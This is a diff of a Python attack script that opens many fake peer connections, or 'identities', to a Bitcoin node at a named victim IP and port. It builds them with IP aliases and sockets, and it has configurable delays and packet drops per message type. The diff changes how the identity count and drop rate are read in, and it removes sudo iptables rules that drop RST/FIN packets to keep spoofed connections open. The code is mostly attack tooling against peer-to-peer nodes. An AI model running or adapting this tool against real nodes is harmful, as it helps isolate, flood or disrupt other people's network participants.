@@ -24,13 +24,8 @@ victim_ip = '10.0.2.5'
 victim_port = 8333
 
 # How many identities should run simultaneously
-num_identities = -1
-while num_identities < 0:
-	try:
-		num_identities = int(input('How many identities would you like? '))
-	except: pass
-
-percentage_to_drop = 0
+num_identities = int(input('How many identities would you like? '))
+percentage_to_drop = float(input(f'What is the packet drop rate (0 to 1)? '))
 
 seconds_delay = { # -1 to drop the packet
 	'version': -1,
@@ -168,12 +163,6 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 	if verbose: print(f'Successfully set up IP alias on interface {interface}')
 	if verbose: print('Resulting ifconfig interface:')
 	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
-
-	if verbose: print('Setting up iptables configurations')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
 
 	if verbose: print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
